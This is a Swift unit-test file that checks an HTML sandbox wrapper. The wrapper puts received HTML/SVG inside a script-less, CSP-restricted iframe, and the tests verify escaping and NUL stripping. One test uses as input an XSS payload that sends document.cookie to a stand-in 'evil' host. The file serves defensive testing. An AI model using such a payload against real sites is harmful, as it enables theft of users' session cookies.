import XCTest
@testable import HerdrKit

/// The sandbox wrapper is what stops a received HTML/SVG file from running script
/// in the preview. Verified on Linux (the string wrapping); rendering behavior is
/// checked on device/buildbox.
final class HtmlSandboxTests: XCTestCase {

    func testWrapsInSandboxedIframeWithNoScripts() {
        let out = HtmlSandbox.wrap("<h1>hi</h1>")
        XCTAssertTrue(out.contains("<iframe sandbox"), out)
        // A sandbox WITHOUT allow-scripts is the whole point.
        XCTAssertFalse(out.lowercased().contains("allow-scripts"), out)
        XCTAssertTrue(out.hasPrefix("<!doctype html>"), out)
    }

    func testHostileScriptIsInertInsideTheSandbox() {
        // The script lands inside the sandboxed srcdoc, where the browser will not
        // execute it. The quote in its attribute is escaped so it can't break out
        // of the srcdoc attribute and become a sibling of the iframe.
        let out = HtmlSandbox.wrap(#"<script>fetch("https://evil/"+document.cookie)</script>"#)
        // The only script text present must be within the srcdoc attribute value,
        // i.e. after `srcdoc="`, never as a top-level element.
        guard let srcdocStart = out.range(of: "srcdoc=\"") else {
            return XCTFail("no srcdoc attribute")
        }
        // Assert the positional invariant: every `<script` occurrence sits AFTER the
        // start of the srcdoc attribute value — none escaped out to become a sibling.
        var searchFrom = out.startIndex
        while let hit = out.range(
            of: "<script", options: .caseInsensitive, range: searchFrom..<out.endIndex)
        {
            XCTAssertGreaterThan(hit.lowerBound, srcdocStart.lowerBound,
                "a <script token escaped the srcdoc attribute: \(out)")
            searchFrom = hit.upperBound
        }
        // The `"` inside the payload is escaped, so the srcdoc attribute is intact.
        XCTAssertTrue(out.contains("&quot;https://evil/&quot;"), out)
    }

    func testAmpersandEscapedBeforeQuotesNoDoubleEncoding() {
        let out = HtmlSandbox.wrap(#"<a href="?a=1&b=2">x</a>"#)
        XCTAssertTrue(out.contains("&amp;b=2"), out)  // & became &amp;
        XCTAssertFalse(out.contains("&amp;amp;"), out)  // not double-encoded
        XCTAssertTrue(out.contains("&quot;"), out)  // the href quotes escaped
    }

    func testTitleIsEscaped() {
        let out = HtmlSandbox.wrap("<p>x</p>", title: "a<b>&\"c")
        XCTAssertTrue(out.contains("<title>a&lt;b&gt;&amp;"), out)
        XCTAssertFalse(out.contains("<title>a<b>"), out)
    }

    func testNulStripped() {
        let out = HtmlSandbox.wrap("<p>a\u{0000}b</p>")
        XCTAssertFalse(out.contains("\u{0000}"), "NUL should be stripped")
    }

    func testStrictCSPIsPresent() {
        // srcdoc inherits the embedder CSP; default-src 'none' blocks the passive
        // img/CSS network beacon that the bare sandbox alone would still permit.
        let out = HtmlSandbox.wrap("<p>x</p>")
        XCTAssertTrue(out.contains("Content-Security-Policy"), out)
        XCTAssertTrue(out.contains("default-src 'none'"), out)
        XCTAssertFalse(out.contains("script-src"), out)  // no script source is whitelisted
    }

    func testInvalidUtf8DataIsStillSandboxed() {
        // A hostile file that is NOT valid UTF-8 (a stray 0xFF before a script) must
        // still be sandboxed — the data path decodes lossily, never falls through to
        // an unsandboxed raw write.
        var bytes: [UInt8] = [0xFF]  // invalid UTF-8 lead byte
        bytes.append(contentsOf: Array("<script>evil()</script>".utf8))
        let out = HtmlSandbox.wrap(data: Data(bytes))
        XCTAssertTrue(out.contains("<iframe sandbox"), out)
        XCTAssertFalse(out.lowercased().contains("allow-scripts"), out)
        // The (lossily decoded) script text lives inside the srcdoc attribute value.
        XCTAssertTrue(out.contains("srcdoc=\""), out)
    }
}
